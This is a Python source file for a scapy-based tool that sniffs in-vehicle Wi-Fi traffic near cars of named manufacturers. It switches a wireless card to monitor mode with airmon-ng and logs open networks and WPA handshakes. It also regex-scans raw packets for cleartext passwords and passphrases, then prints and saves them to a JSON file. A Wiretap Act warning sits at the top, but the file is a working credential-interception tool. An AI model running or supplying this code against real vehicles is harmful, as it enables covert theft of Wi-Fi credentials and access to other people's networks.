"""
Vehicle Wi-Fi Credential Monitor
Captures cleartext credentials from in-vehicle Wi-Fi systems

LEGAL WARNING:
Unauthorized interception of Wi-Fi credentials is a FEDERAL CRIME
under 18 U.S.C. § 2511 (Wiretap Act). Only use on vehicles you own
or have explicit written authorization to test.
"""

import subprocess
import re
from typing import Dict, List, Optional, Tuple
from scapy.all import *
import time
from dataclasses import dataclass

@dataclass
class VehicleWiFiCredentials:
    """Captured vehicle Wi-Fi credentials"""
    ssid: str
    passphrase: Optional[str]
    security: str  # WPA2, WPA3, Open
    bssid: str  # MAC address
    channel: int
    signal_strength: int  # dBm
    manufacturer: str  # Inferred from SSID pattern
    capture_time: float
    
class WiFiCredentialMonitor:
    """
    Monitor vehicle Wi-Fi systems for cleartext credential transmission
    
    Target systems known to transmit credentials:
    - Mercedes-Benz MBUX (older versions)
    - Some aftermarket head units
    - Diagnostic systems
    """
    
    # Known vehicle Wi-Fi SSID patterns
    VEHICLE_PATTERNS = {
        'MB-WLAN': 'Mercedes-Benz',
        'BMW-': 'BMW',
        'Audi': 'Audi',
        'TESLA': 'Tesla',
        'MyFord': 'Ford',
        'IntelliLink': 'GM/Chevrolet',
        'HondaLink': 'Honda',
        'Entune': 'Toyota',
        'UConnect': 'Chrysler/Dodge/Jeep',
        'SYNC': 'Ford',
        'CarPlay': 'Generic CarPlay',
    }
    
    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self.credentials = []
        self.monitoring = False
    
    def set_monitor_mode(self) -> bool:
        """
        Enable monitor mode on wireless interface
        
        Returns:
            True if successful
        """
        try:
            print(f"[WiFi] Setting {self.interface} to monitor mode...")
            
            # Kill interfering processes
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                          capture_output=True, check=False)
            
            # Enable monitor mode
            result = subprocess.run(['sudo', 'airmon-ng', 'start', self.interface],
                                   capture_output=True, text=True)
            
            if result.returncode == 0:
                # Interface name might change (wlan0 -> wlan0mon)
                if 'mon' in result.stdout:
                    self.interface = self.interface + 'mon'
                print(f"✅ Monitor mode enabled on {self.interface}")
                return True
            else:
                print(f"❌ Failed to enable monitor mode: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"❌ Monitor mode error: {e}")
            return False
    
    def disable_monitor_mode(self) -> bool:
        """Disable monitor mode and restore managed mode"""
        try:
            print(f"[WiFi] Restoring managed mode on {self.interface}...")
            
            # Remove 'mon' suffix if present
            base_interface = self.interface.replace('mon', '')
            
            subprocess.run(['sudo', 'airmon-ng', 'stop', self.interface],
                          capture_output=True, check=False)
            
            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'],
                          capture_output=True, check=False)
            
            self.interface = base_interface
            print(f"✅ Managed mode restored")
            return True
            
        except Exception as e:
            print(f"❌ Error restoring managed mode: {e}")
            return False
    
    def start_monitoring(self, duration: float = 300.0, target_patterns: List[str] = None):
        """
        Start monitoring for vehicle Wi-Fi credentials
        
        Args:
            duration: Monitoring duration in seconds
            target_patterns: Specific SSID patterns to target (None = all vehicles)
        """
        if target_patterns is None:
            target_patterns = list(self.VEHICLE_PATTERNS.keys())
        
        print(f"\n{'='*60}")
        print(f"🔍 VEHICLE Wi-Fi CREDENTIAL MONITOR")
        print(f"{'='*60}")
        print(f"Interface: {self.interface}")
        print(f"Duration: {duration} seconds")
        print(f"Targeting: {', '.join(target_patterns)}")
        print(f"⚠️  LEGAL USE ONLY - Requires authorization")
        print(f"{'='*60}\n")
        
        self.monitoring = True
        start_time = time.time()
        packet_count = 0
        vehicle_networks = {}
        
        def packet_handler(pkt):
            nonlocal packet_count, vehicle_networks
            
            if not self.monitoring:
                return
            
            packet_count += 1
            
            # Check for beacon frames (network advertisements)
            if pkt.haslayer(Dot11Beacon):
                self._process_beacon(pkt, vehicle_networks, target_patterns)
            
            # Check for probe responses
            elif pkt.haslayer(Dot11ProbeResp):
                self._process_probe_response(pkt, vehicle_networks, target_patterns)
            
            # Check for EAPOL frames (WPA handshake)
            elif pkt.haslayer(EAPOL):
                self._process_eapol(pkt, vehicle_networks)
            
            # Check for cleartext credentials in management frames
            self._scan_for_cleartext(pkt, target_patterns)
        
        try:
            # Start packet capture
            print(f"[WiFi] Sniffing on {self.interface}...")
            
            sniff(
                iface=self.interface,
                prn=packet_handler,
                timeout=duration,
                store=False
            )
            
            print(f"\n✅ Monitor Complete")
            print(f"   Packets Captured: {packet_count:,}")
            print(f"   Vehicle Networks Found: {len(vehicle_networks)}")
            print(f"   Credentials Extracted: {len(self.credentials)}")
            
            # Display results
            if self.credentials:
                print(f"\n🔑 CAPTURED CREDENTIALS:")
                for cred in self.credentials:
                    print(f"\n   SSID: {cred.ssid}")
                    print(f"   Passphrase: {cred.passphrase or 'N/A'}")
                    print(f"   Security: {cred.security}")
                    print(f"   Manufacturer: {cred.manufacturer}")
                    print(f"   Signal: {cred.signal_strength} dBm")
            
        except KeyboardInterrupt:
            print(f"\n⚠️  Monitoring interrupted by user")
        except Exception as e:
            print(f"❌ Monitoring error: {e}")
        finally:
            self.monitoring = False
    
    def _process_beacon(self, pkt, vehicle_networks, target_patterns):
        """Process beacon frame for vehicle Wi-Fi networks"""
        try:
            if not pkt.haslayer(Dot11Elt):
                return
            
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            bssid = pkt[Dot11].addr3
            
            # Check if this matches vehicle pattern
            manufacturer = None
            for pattern, mfr in self.VEHICLE_PATTERNS.items():
                if pattern in ssid:
                    manufacturer = mfr
                    break
            
            if manufacturer and any(p in ssid for p in target_patterns):
                # Extract security info
                security = self._get_security_type(pkt)
                channel = self._get_channel(pkt)
                signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -100
                
                if ssid not in vehicle_networks:
                    vehicle_networks[ssid] = True
                    print(f"[Vehicle Network] SSID={ssid} Mfr={manufacturer} Sec={security}")
                    
                    # Check for open networks (no password)
                    if security == "Open":
                        cred = VehicleWiFiCredentials(
                            ssid=ssid,
                            passphrase=None,
                            security=security,
                            bssid=bssid,
                            channel=channel,
                            signal_strength=signal,
                            manufacturer=manufacturer,
                            capture_time=time.time()
                        )
                        self.credentials.append(cred)
                        print(f"   ⚠️  OPEN NETWORK - No password required!")
                        
        except Exception as e:
            pass  # Ignore malformed packets
    
    def _process_probe_response(self, pkt, vehicle_networks, target_patterns):
        """Process probe response frames"""
        # Similar to beacon processing
        self._process_beacon(pkt, vehicle_networks, target_patterns)
    
    def _process_eapol(self, pkt, vehicle_networks):
        """Process EAPOL frames (WPA handshake)"""
        # Note: This doesn't extract the password, but identifies
        # networks that are actively authenticating
        try:
            if pkt.haslayer(Dot11):
                bssid = pkt[Dot11].addr3
                print(f"[EAPOL] Handshake detected for BSSID {bssid}")
        except:
            pass
    
    def _scan_for_cleartext(self, pkt, target_patterns):
        """
        Scan packet payload for cleartext credentials
        
        Some older vehicle systems transmit credentials in:
        - Configuration broadcasts
        - Diagnostic messages
        - OBD-II Wi-Fi adapters
        """
        try:
            if pkt.haslayer(Raw):
                payload = bytes(pkt[Raw].load)
                
                # Look for common credential patterns
                password_patterns = [
                    rb'password[=:]\s*([^\s&]+)',
                    rb'passphrase[=:]\s*([^\s&]+)',
                    rb'psk[=:]\s*([^\s&]+)',
                    rb'wpa_passphrase=([^\n]+)',
                ]
                
                for pattern in password_patterns:
                    match = re.search(pattern, payload, re.IGNORECASE)
                    if match:
                        passphrase = match.group(1).decode('utf-8', errors='ignore')
                        print(f"⚠️  CLEARTEXT CREDENTIAL DETECTED:")
                        print(f"   Password: {passphrase}")
                        
                        # Try to associate with SSID
                        if pkt.haslayer(Dot11):
                            ssid_match = re.search(rb'ssid[=:]\s*([^\s&]+)', payload, re.IGNORECASE)
                            if ssid_match:
                                ssid = ssid_match.group(1).decode('utf-8', errors='ignore')
                                
                                # Check if vehicle network
                                manufacturer = "Unknown"
                                for pattern, mfr in self.VEHICLE_PATTERNS.items():
                                    if pattern in ssid:
                                        manufacturer = mfr
                                        break
                                
                                cred = VehicleWiFiCredentials(
                                    ssid=ssid,
                                    passphrase=passphrase,
                                    security="WPA2 (Cleartext)",
                                    bssid=pkt[Dot11].addr3 if pkt.haslayer(Dot11) else "Unknown",
                                    channel=0,
                                    signal_strength=-100,
                                    manufacturer=manufacturer,
                                    capture_time=time.time()
                                )
                                self.credentials.append(cred)
        except:
            pass
    
    def _get_security_type(self, pkt) -> str:
        """Determine security type from beacon/probe response"""
        try:
            # Check for RSN (WPA2/WPA3)
            if pkt.haslayer(RSNInfo):
                return "WPA2/WPA3"
            # Check for WPA (legacy)
            elif pkt.haslayer(Dot11Elt) and pkt[Dot11Elt].ID == 221:  # Vendor specific (WPA)
                return "WPA"
            else:
                # Check privacy bit
                cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
                if "privacy" in cap.lower():
                    return "WEP"
                else:
                    return "Open"
        except:
            return "Unknown"
    
    def _get_channel(self, pkt) -> int:
        """Extract channel from beacon frame"""
        try:
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while elt:
                    if elt.ID == 3:  # DS Parameter Set
                        return ord(elt.info)
                    elt = elt.payload.getlayer(Dot11Elt)
        except:
            pass
        return 0
    
    def get_credentials(self) -> List[VehicleWiFiCredentials]:
        """Get all captured credentials"""
        return self.credentials
    
    def save_credentials(self, filename: str = "vehicle_wifi_credentials.json"):
        """Save captured credentials to JSON file"""
        import json
        from dataclasses import asdict
        
        data = [asdict(cred) for cred in self.credentials]
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"✅ Credentials saved: {filename}")

